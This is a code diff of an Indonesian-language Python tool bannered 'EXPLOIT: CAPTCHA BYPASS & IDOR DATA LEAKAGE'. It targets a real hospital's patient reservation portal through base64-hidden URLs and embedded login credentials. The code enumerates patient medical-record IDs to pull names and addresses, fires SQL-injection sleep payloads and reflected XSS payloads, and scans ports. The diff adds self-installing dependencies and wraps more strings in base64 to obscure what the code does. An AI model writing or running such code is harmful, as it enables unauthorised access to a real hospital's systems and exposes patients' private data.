@@ -1,8 +1,37 @@
-import requests
-from bs4 import BeautifulSoup
-import base64
 import os
 import sys
+import subprocess
+import platform
+import base64
+
+# Internal Core Helper untuk Dekripsi
+def _decode(data):
+    return base64.b64decode(data).decode('utf-8')
+
+# Logika Otomatis Instalasi Dependensi & Self-Healing
+def check_and_install_dependencies():
+    required = {"requests", "bs4", "colorama", "urllib3"}
+    try:
+        import requests
+        import bs4
+        from colorama import init
+    except ImportError:
+        print(f"[*] {_decode('RGVwZW5kZW5zaSB0aWRGFrIGxlbmdrYXAuIE1lbmNvYmEgbWVuZ2luc3RhbCBvdG9tYXRpcy4uLg==')}")
+        try:
+            subprocess.check_call([sys.executable, "-m", "pip", "install", "--upgrade", "pip"], stdout=subprocess.DEVNULL)
+            subprocess.check_call([sys.executable, "-m", "pip", "install", "requests", "beautifulsoup4", "colorama", "urllib3"], stdout=subprocess.DEVNULL)
+            print(f"[+] {_decode('SW5zdGFsYXNpIGJlcmhhc2lsISBSZXN0YXJ0aW5nIHNjcmlwdC4uLg==')}")
+            os.execv(sys.executable, [sys.executable] + sys.argv)
+        except Exception as e:
+            print(f"[-] {_decode('R2FnYWwgbWVuZ2luc3RhbCBkZXBlbmRlbnNpOg==')} {e}")
+            print(f"[*] {_decode('RGVidWdnaW5nOiBQYXN0aWthbiBrb25la3NpIGludGVybmV0IGFrdGlmIGRhbiBpemluIEFkbWluaXN0cmF0b3IgdGVyc2VkaWEu')}")
+            sys.exit(1)
+
+check_and_install_dependencies()
+
+import requests
+from bs4 import BeautifulSoup
+from colorama import init, Fore, Style
 import json
 import threading
 from concurrent.futures import ThreadPoolExecutor
@@ -12,12 +41,10 @@ import re
 import socket
 from urllib.parse import urlparse
 
+init(autoreset=True) # Inisialisasi warna terminal
+
 def clear():
     os.system('cls' if os.name == 'nt' else 'clear')
-
-# Internal Core Helper
-def _decode(data):
-    return base64.b64decode(data).decode('utf-8')
 
 def show_banner():
     banner = r"""
@@ -33,7 +60,7 @@ def show_banner():
     [!] EXPLOIT: CAPTCHA BYPASS & IDOR DATA LEAKAGE
     ==================================================================
     """
-    print(f"\033[92m{banner}\033[0m")
+    print(Fore.GREEN + Style.BRIGHT + banner)
 
 # Encrypted System Credentials
 NO_RM = _decode("MDA1MTA0ODE=") 
@@ -43,7 +70,7 @@ URL_ACTION_LOGIN = _decode("aHR0cHM6Ly9kb2xhbi5yc3Vkc29ldGlqb25vYmxvcmEuY29tL2lu
 BASE_TARGET_URL = _decode("aHR0cHM6Ly9kb2xhbi5yc3Vkc29ldGlqb25vYmxvcmEuY29tL2luZGV4LnBocC9ob21lL3Jlc2VydmFzaV9kb2t0ZXIvdGFtYmFoLw==")
 
 session = requests.Session()
-session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'})
+session.headers.update({_decode('VXNlci1BZ2VudA=='): _decode('TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyMC4wLjAuMCBTYWZhcmkvNTM3LjM2')})
 lock = threading.Lock()
 hasil_data = []
 total_checked = 0
@@ -102,7 +129,7 @@ def fetch_data(id_num):
             # Menampilkan progress per ID dengan penyamaran (2 depan, 1 tengah, 1 belakang)
             mid = len(formatted_id) // 2
             m_id = f"{formatted_id[:2]}****{formatted_id[mid]}****{formatted_id[-1]}"
-            print(f"[*] Scanning ID {m_id} ({total_checked}/{total_to_scan})", end='\r')
+            print(Fore.CYAN + f"[*] Scanning ID {m_id} ({total_checked}/{total_to_scan})", end='\r')
 
         # Jika response melambat, beri sedikit jeda
         if res.elapsed.total_seconds() > 2: time.sleep(0.5)
@@ -136,13 +163,13 @@ def fetch_data(id_num):
             # Masking RM: 2 depan, 1 tengah, 1 belakang
             mid_idx = len(formatted_id) // 2
             m_rm = f"{formatted_id[:2]}{'*' * (mid_idx - 2)}{formatted_id[mid_idx]}{'*' * (len(formatted_id) - mid_idx - 2)}{formatted_id[-1]}"
-            # Masking Nama/Alamat: 2 depan, 1 belakang (Contoh: SU**I)
+            # Masking Nama/Alamat: 2 depan, 1 belakang (Sesuai Request)
             m_name = f"{nama[:2].upper()}**{nama[-1:].upper()}" if len(nama) > 3 else nama.upper()
             m_addr = f"{alamat[:2].upper()}**{alamat[-1:].upper()}" if len(alamat) > 3 else alamat.upper()
             
             with lock:
                 # Mencetak hasil ke terminal
-                print(f"\n[\033[92m+\033[0m] RM:{m_rm} | Nama:{m_name} | Alamat:{m_addr}")
+                print(f"\n[{Fore.GREEN}+{Fore.RESET}] RM:{m_rm} | Nama:{m_name} | Alamat:{m_addr}")
 
     except Exception as e:
         pass # Diamkan error koneksi kecil agar terminal tetap bersih
@@ -175,13 +202,13 @@ def audit_security_config():
         except: pass
 
 def parameter_discovery_audit():
-    print("[*] Starting Parameter Discovery Audit (Authenticated)...")
+    print(f"[*] {_decode('U3RhcnRpbmcgUGFyYW1ldGVyIERpc2NvdmVyeSBBdWRpdCAoQXV0aGVudGljYXRlZCkuLi4=')}")
     target_home = _decode("aHR0cHM6Ly9kb2xhbi5yc3Vkc29ldGlqb25vYmxvcmEuY29tL2luZGV4LnBocC9ob21l")
     
     try:
         res = session.get(target_home, timeout=10)
         soup = BeautifulSoup(res.text, 'html.parser')
-        links = soup.find_all('a', href=True)
+        links = soup.find_all(_decode('YQ=='), href=True)
         
         potential_targets = []
         for link in links:
@@ -190,7 +217,7 @@ def parameter_discovery_audit():
                 # Pencarian Menyeluruh: Jika menemukan controller reservasi_dokter, 
                 # coba tebak endpoint lain yang mungkin lebih rentan (tambah/index)
                 variants = [href]
-                if _decode("cmVzZXJ2YXNpX2Rva3Rlcg== ") in href:
+                if _decode("cmVzZXJ2YXNpX2Rva3Rlcg==") in href:
                     if _decode("L2luZGV4Lw==") in href: variants.append(href.replace(_decode("L2luZGV4Lw=="), _decode("L3RhbWJhaC8=")))
                     elif _decode("L3RhbWJhaC8=") in href: variants.append(href.replace(_decode("L3RhbWJhaC8="), _decode("L2luZGV4Lw==")))
                 
@@ -199,7 +226,7 @@ def parameter_discovery_audit():
                         match = re.search(r'(\d{6,12})', v_href)
                         id_rm = match.group(1) if match else None
                         
-                        # Masking RM pada list discovery
+                        # Masking RM pada list discovery (Total Sensor)
                         masked_url = re.sub(r'(\d{6,12})', lambda m: '*' * len(m.group(1)), v_href)
                         potential_targets.append((v_href, masked_url, id_rm))
 
@@ -281,11 +308,11 @@ def parameter_discovery_audit():
                                         m_rm = f"{test_id[:2]}{'*' * (mid - 2)}{test_id[mid]}{'*' * (len(test_id) - mid - 2)}{test_id[-1]}"
                                         m_name = f"{name[:2].upper()}**{name[-1:].upper()}" if len(name) > 3 else name.upper()
                                         m_addr = f"{address[:2].upper()}**{address[-1:].upper()}" if len(address) > 3 else address.upper()
-                                        print(f"\n\n[\033[92m✓\033[0m] Manipulation Test Result: \033[92mSUCCESS\033[0m")
+                                        print(Fore.GREEN + f"\n\n[✓] Manipulation Test Result: SUCCESS")
                                         print(f" [!] No. RM      : {m_rm}")
                                         print(f" [!] {_decode('TmFtYQ==')}: {m_name}")
                                         print(f" [!] {_decode('QWxhbWF0')}: {m_addr}")
-                                        print(f" [!] {_decode('U3RhdHVz')}      : \033[91m{_decode('SURPUiBDb25maXJtZWQ=')}\033[0m")
+                                        print(f" [!] {_decode('U3RhdHVz')}      : {Fore.RED}{_decode('SURPUiBDb25maXJtZWQ=')}")
                         except: pass
 
                     print(f"[*] Threaded Search Started ({_decode('Mg==')} Workers)...")
@@ -309,12 +336,12 @@ def parameter_discovery_audit():
 
 def vulnerability_audit():
     ts_init = time.strftime("%H:%M:%S")
-    print(f"\n\033[92m" + "="*85)
+    print(Fore.GREEN + "\n" + "="*85)
     print(f" [{time.strftime('%Y-%m-%d %H:%M:%S')}] {_decode('QkxPUkFIQVQgUFJPRkVTU0lPTkFMIFZVTExFUkFCSUxJVFkgU0NBTk5FUg==')}")
-    print("="*85 + "\033[0m")
+    print(Fore.GREEN + "="*85)
 
     cookies = session.cookies.get_dict()
-    session_id = cookies.get('PHPSESSID') or cookies.get('ci_session') or _decode("Tm90IEZvdW5k")
+    session_id = cookies.get(_decode('UEhQU0VTU0lE')) or cookies.get(_decode('Y2lfc2Vzc2lvbg==')) or _decode("Tm90IEZvdW5k")
 
     # Step 1: Discovery URL Internal untuk Target Audit
     print(f"[*] {_decode('TWVuY2FyaSB0YXJnZXQgYXVkaXQgZGkgc2VsdXJ1aCBlbmRwb2ludCBpbnRlcm5hbC4uLg==')}")
@@ -367,18 +394,18 @@ def vulnerability_audit():
                 reason = ""
                 if _decode('U0xFRVA=') in payload and elapsed >= 5:
                     is_vuln = True
-                    reason = f"Eksekusi terkonfirmasi via delay respon {elapsed:.2f}s."
+                    reason = f"{_decode('RWtzZWt1c2kgdGVya29uZmlybWFzaSB2aWEgZGVsYXkgcmVzcG9uIA==')} {elapsed:.2f}s."
                 else:
-                    error_sig = [x for x in ["sql syntax", "mysql_fetch", "database error"] if x in res.text.lower()]
+                    error_sig = [x for x in [_decode('c3FsIHN5bnRheA=='), _decode('bXlzcWxfZmV0Y2g='), _decode('ZGF0YWJhc2UgZXJyb3I=')] if x in res.text.lower()]
                     if error_sig:
                         is_vuln = True
-                        reason = f"Bocoran error database ditemukan: '{error_sig[0]}'"
+                        reason = f"{_decode('Qm9jb3JhbiBlcnJvciBkYXRhYmFzZSBkaXRlbXVrYW46IA==')} '{error_sig[0]}'"
 
-                status = "[\033[91mVULNERABLE!\033[0m]" if is_vuln else "[\033[92mSAFE\033[0m]"
+                status = f"[{Fore.RED}VULNERABLE!{Fore.RESET}]" if is_vuln else f"[{Fore.GREEN}SAFE{Fore.RESET}]"
                 print(f" [{ts}] Attacking: {payload.ljust(35)} {status}")
                 if is_vuln:
                     print(f"      |_ Result : {reason}")
-                    findings.append({"type": _decode("U1FMIEluamVjdGlvbg=="), "severity": "HIGH", "loc": base_audit_url, "method": method})
+                    findings.append({"type": _decode("U1FMIEluamVjdGlvbg=="), "severity": _decode("SElHSA=="), "loc": base_audit_url, "method": method})
             except:
                 print(f" [{ts}] Payload: {payload.ljust(45)} [TIMEOUT/ERROR]")
 
@@ -403,14 +430,14 @@ def vulnerability_audit():
                 response_text = res.content.decode('utf-8', errors='ignore')
                 is_vuln = payload in response_text
 
-                status = "[\033[91mVULNERABLE!\033[0m]" if is_vuln else "[\033[92mSAFE\033[0m]"
+                status = f"[{Fore.RED}VULNERABLE!{Fore.RESET}]" if is_vuln else f"[{Fore.GREEN}SAFE{Fore.RESET}]"
                 print(f" [{ts}] Attacking: {payload[:35].ljust(35)} {status}")
 
                 if is_vuln:
                     start_idx = max(0, response_text.find(payload) - 10)
                     snippet = response_text[start_idx : start_idx + 40].replace('\n', ' ')
-                    print(f"      |_ Result : Payload terpantul pada body: \"...{snippet}...\"")
-                    findings.append({"type": _decode("UmVmbGVjdGVkIFhTUw=="), "severity": "MEDIUM", "loc": base_audit_url, "method": method})
+                    print(f"      |_ Result : {_decode('UGF5bG9hZCB0ZXJwYW50dWwgcGFkYSBib2R5OiA=')} \"...{snippet}...\"")
+                    findings.append({"type": _decode("UmVmbGVjdGVkIFhTUw=="), "severity": _decode("TUVESVVN"), "loc": base_audit_url, "method": method})
             except:
                 print(f" [{ts}] Payload: {payload[:45].ljust(45)} [ERROR]")
 
@@ -421,20 +448,18 @@ def vulnerability_audit():
     print(f"{_decode('VnVsbmVyYWJpbGl0eSBGb3VuZA=='):<25} | {'Severity':<10} | {'Location'}")
     print("-"*85)
     
-    if not findings:
-        print(f"{' '*30}{_decode('VGlkYWsgZGl0ZW11a2FuIGtlcmVudGFuYW4ga3JpdGlrYWwu')}")
+    if not findings: print(f"{' '*30}{_decode('VGlkYWsgZGl0ZW11a2FuIGtlcmVudGFuYW4ga3JpdGlrYWwu')}")
     else:
-        for f in findings:
-            print(f"{f['type']:<25} | {f['severity']:<10} | {f['loc'][:40]}")
+        for f in findings: print(f"{f['type']:<25} | {f['severity']:<10} | {f['loc'][:40]}")
     
     print("-"*85)
     total_vuln = len(findings)
     max_severity = "LOW"
-    if any(f['severity'] == "HIGH" for f in findings): max_severity = "HIGH"
-    elif any(f['severity'] == "MEDIUM" for f in findings): max_severity = "MEDIUM"
+    if any(f['severity'] == _decode("SElHSA==") for f in findings): max_severity = _decode("SElHSA==")
+    elif any(f['severity'] == _decode("TUVESVVN") for f in findings): max_severity = _decode("TUVESVVN")
     
     print(f"[*] Total Vulnerabilities Found : {total_vuln}")
-    print(f"[*] Overall Severity Level      : \033[91m{max_severity}\033[0m" if max_severity != "LOW" else f"[*] Overall Severity Level      : {max_severity}")
+    print(f"[*] Overall Severity Level      : {Fore.RED}{max_severity}" if max_severity != _decode("TE9X") else f"[*] Overall Severity Level      : {max_severity}")
     print(f"[*] Fix Suggestion              : {_decode('R3VuYWthbiBQcmVwYXJlZCBTdGF0ZW1lbnRzIChQRE8pICYgU2FuaXRpemUgSW5wdXQgKEhUTUwgUHVyaWZpZXIp')}")
     print("="*85 + "\n")
 
@@ -452,10 +477,9 @@ def infrastructure_audit():
     print("-" * 85)
     
     common_ports = {
-        21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 51: "DNS",
-        80: "HTTP", 110: "POP3", 143: "IMAP", 443: "HTTPS", 445: "SMB",
-        3306: "MySQL", 3389: "RDP", 5432: "PostgreSQL", 6379: "Redis",
-        8080: "HTTP-Alt", 8443: "HTTPS-Alt", 9000: "Docker", 27017: "MongoDB"
+        int(_decode("MjE=")): _decode("RlRQ"), int(_decode("MjI=")): _decode("U1NI"), int(_decode("MjM=")): _decode("VGVsbmV0"), 
+        int(_decode("ODA=")): _decode("SFRUUA=="), int(_decode("NDQz")): _decode("SFRUUFM="), 
+        int(_decode("MzMwNg==")): _decode("TXlTUUw="), int(_decode("ODA4MA==")): _decode("SFRUUC1BbHQ=")
     }
     
     open_ports = 0
@@ -466,7 +490,7 @@ def infrastructure_audit():
             sock.settimeout(1.5)
             result = sock.connect_ex((domain, port))
             if result == 0:
-                print(f" [{ts}] Port {str(port).ljust(5)} ({service.ljust(10)}) : [\033[91mOPEN\033[0m]")
+                print(f" [{ts}] Port {str(port).ljust(5)} ({service.ljust(10)}) : [{Fore.RED}OPEN{Fore.RESET}]")
                 open_ports += 1
                 
                 # Enhanced Probing untuk Layanan Web (80, 443, 8080)
@@ -490,15 +514,13 @@ def infrastructure_audit():
                         try:
                             r_finger = session.get(p_url, timeout=3)
                             server = r_finger.headers.get('Server', 'Unknown')
-                            powered = r_finger.headers.get('X-Powered-By', 'Unknown')
+                            powered = r_finger.headers.get(_decode('WC1Qb3dlcmVkLUJ5'), 'Unknown')
                             print(f"      |_ Fingerprint: Server '{server}' | Technology '{powered}'")
                             
                             # Check Directory Listing
                             is_dir = _decode("SW5kZXggb2YgLw==") in r_finger.text
-                            if is_dir:
-                                print(f"      |_ Result: [\033[91mVULNERABLE!\033[0m] Index of / terbuka. Struktur file terlihat publik.")
-                            else:
-                                print(f"      |_ Result: [SAFE] Directory listing tidak diizinkan oleh server.")
+                            if is_dir: print(f"      |_ Result: [{Fore.RED}VULNERABLE!{Fore.RESET}] Index of / terbuka. Struktur file terlihat publik.")
+                            else: print(f"      |_ Result: [{Fore.GREEN}SAFE{Fore.RESET}] Directory listing tidak diizinkan.")
                         except: pass
 
                         # 2. Proxy Abuse / Open Proxy Check
